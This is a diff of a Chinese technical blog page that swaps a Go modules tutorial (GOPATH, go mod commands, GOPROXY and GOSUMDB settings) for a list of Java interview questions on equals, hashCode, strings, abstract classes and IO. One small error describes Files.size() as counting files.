+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String x &#x3D; &quot;string&quot;;</span><br><span class="line">String y &#x3D; &quot;string&quot;;</span><br><span class="line">String z &#x3D; new String(&quot;string&quot;);</span><br><span class="line">System.out.println(x&#x3D;&#x3D;y); &#x2F;&#x2F; true</span><br><span class="line">System.out.println(x&#x3D;&#x3D;z); &#x2F;&#x2F; false</span><br><span class="line">System.out.println(x.equals(y)); &#x2F;&#x2F; true</span><br><span class="line">System.out.println(x.equals(z)); &#x2F;&#x2F; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
-<p>因此在 GOPATH 模式下，我们需要将应用代码存放在固定的 `` <code>go get -u -v 下载到</code> <code>GOPATH</code> 下。</p>
-<h3 id="为什么要弃用-GOPATH"><a href="#为什么要弃用-GOPATH" class="headerlink" title="为什么要弃用 GOPATH"></a>为什么要弃用 GOPATH</h3><p>主要原因：</p>
+<p>代码解读-因为 x 和 y 指向的是同一个引用，所以 == 也是 true，而 new String()方法则重写开辟了内存空间，所以 == 结果为 false，而 equals 比较的一直是值，所以结果都为 true。<br><strong>equals 解读</strong><br>equals 本质上就是 ==，只不过 String 和 Integer 等重写了 equals 方法，把它变成了值比较。看下面的代码就明白了。<br>首先来看默认情况下 equals 比较一个有相同值的对象，代码如下-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Cat &#123;</span><br><span class="line">    public Cat(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">    private String name;</span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Cat c1 &#x3D; new Cat(&quot;王磊&quot;);</span><br><span class="line">Cat c2 &#x3D; new Cat(&quot;王磊&quot;);</span><br><span class="line">System.out.println(c1.equals(c2)); &#x2F;&#x2F; false</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>输出结果出乎我们的意料，竟然是 false？这是怎么回事，看了 equals 源码就知道了，源码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj) &#123;</span><br><span class="line">		return (this &#x3D;&#x3D; obj);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>原来 equals 本质上就是 ==。<br>那问题来了，两个相同值的 String 对象，为什么返回的是 true？代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s1 &#x3D; new String(&quot;老王&quot;);</span><br><span class="line">String s2 &#x3D; new String(&quot;老王&quot;);</span><br><span class="line">System.out.println(s1.equals(s2)); &#x2F;&#x2F; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>同样的，当我们进入 String 的 equals 方法，找到了答案，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object anObject) &#123;</span><br><span class="line">    if (this &#x3D;&#x3D; anObject) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (anObject instanceof String) &#123;</span><br><span class="line">        String anotherString &#x3D; (String)anObject;</span><br><span class="line">        int n &#x3D; value.length;</span><br><span class="line">        if (n &#x3D;&#x3D; anotherString.value.length) &#123;</span><br><span class="line">            char v1[] &#x3D; value;</span><br><span class="line">            char v2[] &#x3D; anotherString.value;</span><br><span class="line">            int i &#x3D; 0;</span><br><span class="line">            while (n-- !&#x3D; 0) &#123;</span><br><span class="line">                if (v1[i] !&#x3D; v2[i])</span><br><span class="line">                    return false;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>原来是 String 重写了 Object 的 equals 方法，把引用比较改成了值比较。<br><strong>总结</strong> == 对于基本类型来说是值比较，对于引用类型来说是比较的是引用；而 equals 默认情况下是引用比较，只是很多类重新了 equals 方法，比如 String、Integer 等把它变成了值比较，所以一般情况下 equals 比较的是值是否相等。</p>
+<h4 id="3-两个对象的-hashCode-相同，则-equals-也一定为-true，对吗？"><a href="#3-两个对象的-hashCode-相同，则-equals-也一定为-true，对吗？" class="headerlink" title="3.两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？"></a>3.两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？</h4><p>不对，两个对象的 hashCode()相同，equals()不一定 true。<br>代码示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String str1 &#x3D; &quot;通话&quot;;</span><br><span class="line">String str2 &#x3D; &quot;重地&quot;;</span><br><span class="line">System.out.println(String.format(&quot;str1 %d | str2 %d&quot;,  str1.hashCode(),str2.hashCode()));</span><br><span class="line">System.out.println(str1.equals(str2));</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>执行的结果<br>str1 1179395 | str2 1179395<br>false<br>代码解读-很显然“通话”和“重地”的 hashCode() 相同，然而 equals() 则为 false，因为在散列表中，hashCode()相等即两个键值对的哈希值相等，然而哈希值相等，并不一定能得出键值对相等。</p>
+<h4 id="4-final-在-java-中有什么作用？"><a href="#4-final-在-java-中有什么作用？" class="headerlink" title="4.final 在 java 中有什么作用？"></a>4.final 在 java 中有什么作用？</h4><ul>
+<li>final 修饰的类叫最终类，该类不能被继承。</li>
+<li>final 修饰的方法不能被重写。</li>
+<li>final 修饰的变量叫常量，常量必须初始化，初始化之后值就不能被修改。</li>
+</ul>
+<h4 id="5-java-中的-Math-round-1-5-等于多少？"><a href="#5-java-中的-Math-round-1-5-等于多少？" class="headerlink" title="5.java 中的 Math.round(-1.5) 等于多少？"></a>5.java 中的 Math.round(-1.5) 等于多少？</h4><p>等于 -1，因为在数轴上取值时，中间值（0.5）向右取整，所以正 0.5 是往上取整，负 0.5 是直接舍弃。</p>
+<h4 id="6-String-属于基础的数据类型吗？"><a href="#6-String-属于基础的数据类型吗？" class="headerlink" title="6.String 属于基础的数据类型吗？"></a>6.String 属于基础的数据类型吗？</h4><p>String 不属于基础类型，基础类型有 8 种-byte、boolean、char、short、int、float、long、double，而 String 属于对象。</p>
+<h4 id="7-java-中操作字符串都有哪些类？它们之间有什么区别？"><a href="#7-java-中操作字符串都有哪些类？它们之间有什么区别？" class="headerlink" title="7.java 中操作字符串都有哪些类？它们之间有什么区别？"></a>7.java 中操作字符串都有哪些类？它们之间有什么区别？</h4><p>操作字符串的类有-String、StringBuffer、StringBuilder。<br>String 和 StringBuffer、StringBuilder 的区别在于 String 声明的是不可变的对象，每次操作都会生成新的 String 对象，然后将指针指向新的 String 对象，而 StringBuffer、StringBuilder 可以在原有对象的基础上进行操作，所以在经常改变字符串内容的情况下最好不要使用 String。<br>StringBuffer 和 StringBuilder 最大的区别在于，StringBuffer 是线程安全的，而 StringBuilder 是非线程安全的，但 StringBuilder 的性能却高于 StringBuffer，所以在单线程环境下推荐使用 StringBuilder，多线程环境下推荐使用 StringBuffer。</p>
+<h4 id="8-String-str-”i”与-String-str-new-String-“i”-一样吗？"><a href="#8-String-str-”i”与-String-str-new-String-“i”-一样吗？" class="headerlink" title="8.String str=”i”与 String str=new String(“i”)一样吗？"></a>8.String str=”i”与 String str=new String(“i”)一样吗？</h4><p>不一样，因为内存的分配方式不一样。String str=”i”的方式，java 虚拟机会将其分配到常量池中；而 String str=new String(“i”) 则会被分到堆内存中。</p>
+<h4 id="9-如何将字符串反转？"><a href="#9-如何将字符串反转？" class="headerlink" title="9.如何将字符串反转？"></a>9.如何将字符串反转？</h4><p>使用 StringBuilder 或者 stringBuffer 的 reverse() 方法。<br>示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; StringBuffer reverse</span><br><span class="line">StringBuffer stringBuffer &#x3D; new StringBuffer();</span><br><span class="line">stringBuffer.append(&quot;abcdefg&quot;);</span><br><span class="line">System.out.println(stringBuffer.reverse()); &#x2F;&#x2F; gfedcba</span><br><span class="line">&#x2F;&#x2F; StringBuilder reverse</span><br><span class="line">StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">stringBuilder.append(&quot;abcdefg&quot;);</span><br><span class="line">System.out.println(stringBuilder.reverse()); &#x2F;&#x2F; gfedcba</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-String-类的常用方法都有那些？"><a href="#10-String-类的常用方法都有那些？" class="headerlink" title="10.String 类的常用方法都有那些？"></a>10.String 类的常用方法都有那些？</h4><ul>
+<li>indexOf()返回指定字符的索引。</li>
+<li>charAt()返回指定索引处的字符。</li>
+<li>replace()字符串替换。</li>
+<li>trim()去除字符串两端空白。</li>
+<li>split()分割字符串，返回一个分割后的字符串数组。</li>
+<li>getBytes()返回字符串的 byte 类型数组。</li>
+<li>length()返回字符串长度。</li>
+<li>toLowerCase()将字符串转成小写字母。</li>
+<li>toUpperCase()将字符串转成大写字符。</li>
+<li>substring()截取字符串。</li>
+<li>equals()字符串比较。</li>
+</ul>
+<h4 id="11-抽象类必须要有抽象方法吗？"><a href="#11-抽象类必须要有抽象方法吗？" class="headerlink" title="11.抽象类必须要有抽象方法吗？"></a>11.抽象类必须要有抽象方法吗？</h4><p>不需要，抽象类不一定非要有抽象方法。<br>示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abstract class Cat &#123;</span><br><span class="line">    public static void sayHi() &#123;</span><br><span class="line">        System.out.println(&quot;hi~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>上面代码，抽象类并没有抽象方法但完全可以正常运行。</p>
+<h4 id="12-普通类和抽象类有哪些区别？"><a href="#12-普通类和抽象类有哪些区别？" class="headerlink" title="12.普通类和抽象类有哪些区别？"></a>12.普通类和抽象类有哪些区别？</h4><ul>
+<li>普通类不能包含抽象方法，抽象类可以包含抽象方法。</li>
+<li>抽象类不能直接实例化，普通类可以直接实例化。</li>
+</ul>
+<h4 id="13-抽象类能使用-final-修饰吗？"><a href="#13-抽象类能使用-final-修饰吗？" class="headerlink" title="13.抽象类能使用 final 修饰吗？"></a>13.抽象类能使用 final 修饰吗？</h4><p>不能，定义抽象类就是让其他类继承的，如果定义为 final 该类就不能被继承，这样彼此就会产生矛盾，所以 final 不能修饰抽象类，如下图所示，编辑器也会提示错误信息<br>​</p>
+<p>14.接口和抽象类有什么区别？</p>
 <ul>
-<li>GOPATH 模式没有版本控制的概念，具有致命的缺陷，至少会有以下问题<ul>
-<li>在执行 go get 时，你无法传达任何的版本信息，也就是说你无法知道自己当前更新的哪一个版本，也无法拉取自己所期望的版本</li>
-<li>在运行 go 应用时，你无法保证其他人与你所期望依赖的第三方库是相同的版本，也就是说在项目依赖库的管理上，你无法保证所有人的依赖版本一致。</li>
-<li>你没办法处理 v1,v2,v3 等不同版本的引用问题，因为 GOPATH 下导入的路径都是一样的</li>
+<li>实现 抽象类的子类使用 extends 来继承；接口必须使用 implements 来实现接口。</li>
+<li>构造函数 抽象类可以有构造函数；接口不能有。</li>
+<li>main 方法 抽象类可以有 main 方法，并且我们能运行它；接口不能有 main 方法。</li>
+<li>实现数量 类可以实现很多个接口；但是只能继承一个抽象类。</li>
+<li>访问修饰符 接口中的方法默认使用 public 修饰；抽象类中的方法可以是任意访问修饰符。</li>
 </ul>
-</li>
-<li>GO 语言官方从 go 1.11 起开始推进 go modules</li>
+<h4 id="15-java-中-IO-流分为几种？"><a href="#15-java-中-IO-流分为几种？" class="headerlink" title="15.java 中 IO 流分为几种？"></a>15.java 中 IO 流分为几种？</h4><p>按功能来分输入流（input）、输出流（output）。<br>按类型来分字节流和字符流。<br>字节流和字符流的区别是 字节流按 8 位传输以字节为单位输入输出数据，字符流按 16 位传输以字符为单位输入输出数据。</p>
+<h4 id="16-BIO、NIO、AIO-有什么区别？"><a href="#16-BIO、NIO、AIO-有什么区别？" class="headerlink" title="16.BIO、NIO、AIO 有什么区别？"></a>16.BIO、NIO、AIO 有什么区别？</h4><ul>
+<li>BIO-Block IO 同步阻塞式 IO，就是我们平常使用的传统 IO，它的特点是模式简单使用方便，并发处理能力低。</li>
+<li>NIO-New IO 同步非阻塞 IO，是传统 IO 的升级，客户端和服务器端通过 Channel（通道）通讯，实现了多路复用。</li>
+<li>AIO-Asynchronous IO 是 NIO 的升级，也叫 NIO2，实现了异步非堵塞 IO ，异步 IO 的操作基于事件和回调机制。</li>
 </ul>
-<h3 id="GOPATH-同期其他方案"><a href="#GOPATH-同期其他方案" class="headerlink" title="GOPATH 同期其他方案"></a>GOPATH 同期其他方案</h3><p>go 1 在 2012 年 03 月 28 号发布<br>go 1.11 是在 2018 年 08 月 25 号才正式发布<br>在这个空档时间内，并没有 go modules 这一个东西，早期还好说，因为刚发布，使用的人不多，所以没有明显暴露，但是后期 go 语言使用的人越来越多了，那怎么办？</p>
-<p>这时候社区涌现了大量的依赖解决方案，百花齐放；其中有名的有</p>
-<ul>
-<li>vendor</li>
-<li>dep</li>
+<h4 id="17-Files-的常用方法都有哪些？"><a href="#17-Files-的常用方法都有哪些？" class="headerlink" title="17.Files 的常用方法都有哪些？"></a>17.Files 的常用方法都有哪些？</h4><ul>
+<li>Files.exists()检测文件路径是否存在。</li>
+<li>Files.createFile()创建文件。</li>
+<li>Files.createDirectory()创建文件夹。</li>
+<li>Files.delete()删除一个文件或目录。</li>
+<li>Files.copy()复制文件。</li>
+<li>Files.move()移动文件。</li>
+<li>Files.size()查看文件个数。</li>
+<li>Files.read()读取文件。</li>
+<li>Files.write()写入文件。</li>
 </ul>
-<p>现在已经退出主流。</p>
-<h2 id="go-modules-使用"><a href="#go-modules-使用" class="headerlink" title="go modules 使用"></a>go modules 使用</h2><p>在初步了解了 go modules 有历史后，我们正式进入到 go modules 的使用介绍，首先我们将从头开始一个 go modules 项目（原则上所创建的目录应试不要放在 GOPATH 中）</p>
-<h3 id="go-mod-常用命令"><a href="#go-mod-常用命令" class="headerlink" title="go mod 常用命令"></a>go mod 常用命令</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>go mod init</td>
-<td>生成  go.mod  文件</td>
-</tr>
-<tr>
-<td>go mod download</td>
-<td>下载 go.mod  中的旨的依赖</td>
-</tr>
-<tr>
-<td>go mod tidy</td>
-<td>整理现在的依赖</td>
-</tr>
-<tr>
-<td>go mod graph</td>
-<td>查看现在的依赖结构</td>
-</tr>
-<tr>
-<td>go mod edit</td>
-<td>编辑  go.mod  文件</td>
-</tr>
-<tr>
-<td>go mod vendor</td>
-<td>导出项目所有的依赖到  vendor  目录</td>
-</tr>
-<tr>
-<td>go mod verify</td>
-<td>校验一个模块是否被篡改过</td>
-</tr>
-<tr>
-<td>go mod why</td>
-<td>查看为什么需要依赖某模块</td>
-</tr>
-</tbody></table>
-<p><a href="">
-</a></p>
-<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>在 go modules 中有如下常用环境变量，我们可以通过 go env 来查看，</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">GO111MODULE=<span class="string">&quot;on&quot;</span></span><br><span class="line">GOARCH=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">GOBIN=<span class="string">&quot;&quot;</span></span><br><span class="line">GOCACHE=<span class="string">&quot;/Users/zhangyi/Library/Caches/go-build&quot;</span></span><br><span class="line">GOENV=<span class="string">&quot;/Users/zhangyi/Library/Application Support/go/env&quot;</span></span><br><span class="line">GOEXE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOFLAGS=<span class="string">&quot;&quot;</span></span><br><span class="line">GOHOSTARCH=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">GOHOSTOS=<span class="string">&quot;darwin&quot;</span></span><br><span class="line">GOINSECURE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOMODCACHE=<span class="string">&quot;/Users/zhangyi/go/pkg/mod&quot;</span></span><br><span class="line">GONOPROXY=<span class="string">&quot;&quot;</span></span><br><span class="line">GONOSUMDB=<span class="string">&quot;&quot;</span></span><br><span class="line">GOOS=<span class="string">&quot;darwin&quot;</span></span><br><span class="line">GOPATH=<span class="string">&quot;/Users/zhangyi/go&quot;</span></span><br><span class="line">GOPRIVATE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOPROXY=<span class="string">&quot;https://goproxy.cn,direct&quot;</span></span><br><span class="line">GOROOT=<span class="string">&quot;/usr/local/Cellar/go/1.15.5/libexec&quot;</span></span><br><span class="line">GOSUMDB=<span class="string">&quot;sum.golang.org&quot;</span></span><br><span class="line">GOTMPDIR=<span class="string">&quot;&quot;</span></span><br><span class="line">GOTOOLDIR=<span class="string">&quot;/usr/local/Cellar/go/1.15.5/libexec/pkg/tool/darwin_amd64&quot;</span></span><br><span class="line">GCCGO=<span class="string">&quot;gccgo&quot;</span></span><br><span class="line">AR=<span class="string">&quot;ar&quot;</span></span><br><span class="line">CC=<span class="string">&quot;clang&quot;</span></span><br><span class="line">CXX=<span class="string">&quot;clang++&quot;</span></span><br><span class="line">CGO_ENABLED=<span class="string">&quot;1&quot;</span></span><br><span class="line">GOMOD=<span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">CGO_CFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_CPPFLAGS=<span class="string">&quot;&quot;</span></span><br><span class="line">CGO_CXXFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_FFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_LDFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">PKG_CONFIG=<span class="string">&quot;pkg-config&quot;</span></span><br><span class="line">GOGCCFLAGS=<span class="string">&quot;-fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=/var/folders/mt/w0md4fbn74xggzrf18zb1v_h0000gn/T/go-build583788123=/tmp/go-build -gno-record-gcc-switches -fno-common&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><a href="">      </a><br><a href="">每个命令 设置的时候 可以 用 go env -w </a></p>
-<h4 id="GO111MODULE"><a href="#GO111MODULE" class="headerlink" title="GO111MODULE"></a>GO111MODULE</h4><p>作为 go modules 功能的开关，其允许设置以下参数：</p>
-<ul>
-<li>auto 只要项目包含了 go.mod 文件就自动启用 go modules<ul>
-<li>目前在 1.11~1.14 中仍然是默认值</li>
-</ul>
-</li>
-<li>on   启用 go modules</li>
-<li>off   禁用 go modules</li>
-</ul>
-<h4 id="GOPROXY"><a href="#GOPROXY" class="headerlink" title="GOPROXY"></a>GOPROXY</h4><p>用于设置 go 模块代理，作用用于使 go 在后续拉取模块版本时能够脱离传统的 VCS 方式，直接通过镜像来快速拉取。</p>
-<p>GOPROXY 的默认值<br><a href="">
-</a></p>
-<p>这有一个严重问题，就是在国内无法访问 <a target="_blank" rel="noopener" href="https://proxy.golang.org/">https://proxy.golang.org</a><br>，因此这会直接卡住你的第一步，所以你必须在开启 go modules 时，指定 GOPROXY<br><a href="">
-</a></p>
-<p>GOPROXY 的值是一个以英文逗号来分割的列表，可以设置多个值；如果你不想使用，也可以设置为 <code>off</code> ，这会禁用 go 在后续操作中使用任何 go 模块代理</p>
-<p>direct 是什么？<br>上面的设置中，列表中有个 direct 标识，它有什么作用呢？<br>实际上，direct 是一个特殊的标识符，用于指示 go 回源到模块版本的源地址去抓取（比如 github 等），场景如下：</p>
-<ol>
-<li>当值列表中上一个 go 模块代理返回 404/410 时，</li>
-<li>go 自动尝试列表中下一个，</li>
-<li>遇到 direct 时回源（也就是回到源地址去抓取），</li>
-<li>而遇到 EOF 时终止并抛出类似“invalid version: unknown revision…”的错误。</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/106947/1583064116238-1d06dc6a-a478-4f75-825f-59d1495d5a85.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&originHeight=334&originWidth=760&status=done&style=none&width=760"></p>
-<h3 id="GOSUMDB"><a href="#GOSUMDB" class="headerlink" title="GOSUMDB"></a>GOSUMDB</h3><p>用于在拉取模块版本时（无论是从源站还是通过 go modules proxy）保证拉取到的模块的数据未经过篡改，若发布不一致，也就是可能存在篡改</p>
-<p>GOSUMDB 默认值</p>
-<p><a href="">
-</a></p>
-<p>同样， 在国内是无法访问的，但是 GOSUMDB 可以这被 GOPROXY 所代理（详见：Proxying a Checksum Database）</p>
-<p>因此我们可以通过设置 GOPROXY 来解决，而先前我们所设置的模块代理 goproxy.cn 就能支持代理 sum.golang.org，所以，这一个问题在设置 GOPROXY 后，就不需要关心了</p>
-<p>另外若对 GOSUMDB 有自定义需求，其支持中如下格式：</p>
-<ul>
-<li>格式 1: <code>&lt;SUMDB_NAME&gt;+&lt;PUBLIC_KEY&gt;</code></li>
-<li>格式 2: <code>&lt;SUMDB_NAME&gt;+&lt;PUBLIC_KEY&gt; &lt;SUMDB_URL&gt;</code></li>
-</ul>
-<p>同样，也可以设置为 <code>off</code> ，关闭 go 后续操作中校验模块版本功能。</p>
-<h4 id="GONOPROXY-GONOSUMDB-GOPRIVATE"><a href="#GONOPROXY-GONOSUMDB-GOPRIVATE" class="headerlink" title="GONOPROXY/GONOSUMDB/GOPRIVATE"></a>GONOPROXY/GONOSUMDB/GOPRIVATE</h4><p>针对于私有模块的拉取场景<br>一般建议直接设置 GORPIVATE，它的值将作为 GONOPROXY/GONOSUMDB 的默认值，所以建议的最佳姿势是直接使用 GORPIVATE<br><a href="">
-</a></p>
-<p>设置的后，前缀为 git.xxx.com 和 github.com/eddycjy/mquote 的模块都会被认为是私有模块。<br>此处也支持通配符，<br><a href="">
-</a></p>
-<p>这样子设置后，所有要薽路径为 example.com 的子域名都将不经过 GORPOXY 和 GOSUMDB，<strong>需要注意的是不包括 example.com 本身。</strong></p>
-<h3 id="启用-go-mod"><a href="#启用-go-mod" class="headerlink" title="启用 go mod"></a>启用 go mod</h3><p>目前 go modules 并不是默认开启的，因此 go 语言提供了 GO111MODULE 这个环境变量来作为 go modules 的开关，其允许设置以下参数</p>
-<ul>
-<li>auto 默认值，只要项目中包含了 go.mod 文件就启用 go moduels</li>
-<li>on</li>
-<li>off</li>
-</ul>
-<p>如果你不确定你当前的值是什么，可以执行 go env 命令查看<br>如果需要对 GO111MODULE 的值变更，推荐通过 go env 命令设置<br><a href="">
-</a></p>
-<p>但需要注意的是，如果对应的系统环境变量有值了，go env 是不支持覆盖写入的，否则会出现如下报错信息</p>
-<h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>在完成 Go modules 的开启后，我们需要创建一个示例项目来进行演示，执行如下命令：<br>   <a href="">      </a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p $HOME&#x2F;eddycjy&#x2F;module-repo</span><br><span class="line">$ cd $HOME&#x2F;eddycjy&#x2F;module-repo</span><br></pre></td></tr></table></figure>
+      
 
-<p><a href="">
-</a></p>
-<p>初始化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go mod init github.com&#x2F;eddycjy&#x2F;module-repo</span><br><span class="line">go: creating new go.mod: module github.com&#x2F;eddycjy&#x2F;module-repo</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 
-<p><a href="">   </a><br><a href="">
-</a></p>
-<p>在执行 go mod init 命令时，我们指定了模块导入路径为 github.com/eddycjy/module-repo，接下来我们在该项目根目录下创建 main.go 文件</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/eddycjy/mquote&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fmt.Println(mquote.GetHello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%841/">展开全文 >></a>
+        </p>
+      
 
-<p><a href="">
-</a></p>
-<p>然后在项目根目录下执行 go get github.com/eddycjy/mquote 命令，如下</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go: finding github.com/eddycjy/mquote latest</span><br><span class="line">go: downloading github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br><span class="line">go: extracting github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br></pre></td></tr></table></figure>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
 
-<p><a href="">
-</a></p>
-<h3 id="查看-go-mod-文件"><a href="#查看-go-mod-文件" class="headerlink" title="查看 go.mod 文件"></a>查看 go.mod 文件</h3><p>在初始化项目时，会自动生成一个 go.mod 文件，是启用了 go modules 项目所必须的最重要的标识，同时也是 GO111MODULE 值为 auto 时的识别标识，它描述了当前项目的元信息，每一行都以一个动词开头<br>在我们刚刚进行了初始化和简单拉取后，我们再次查看 go.mod 文件，基本内容如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module github.com/eddycjy/module-repo</span><br><span class="line">go 1.13</span><br><span class="line">require (</span><br><span class="line">  github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
 
-<p><a href="">
-</a></p>
-<p>为了更进一步的讲解，我们模拟引用如下</p>
